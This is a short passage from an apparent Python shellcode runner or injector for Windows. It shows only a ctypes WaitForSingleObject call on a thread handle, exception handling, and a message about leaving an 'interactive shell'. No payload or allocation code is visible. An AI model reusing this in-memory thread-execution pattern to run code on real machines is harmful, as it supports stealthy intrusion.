                                                             ctypes.pointer(ctypes.c_int(0)))

                    ctypes.windll.kernel32.WaitForSingleObject(
                        ctypes.c_int(ht), ctypes.c_int(-1))

                # handle error messages
                except Exception as e:
                    if verbose == True:
                        print(e)
                    pass

# keyboard interrupts here
except KeyboardInterrupt:
    if verbose == True:
        print("[!] KeyboardInterrupt detected. Bombing out of the interactive shell.")

# handle exceptions
except Exception as e:
    if verbose == True:
        print(e)
    sys.exit()
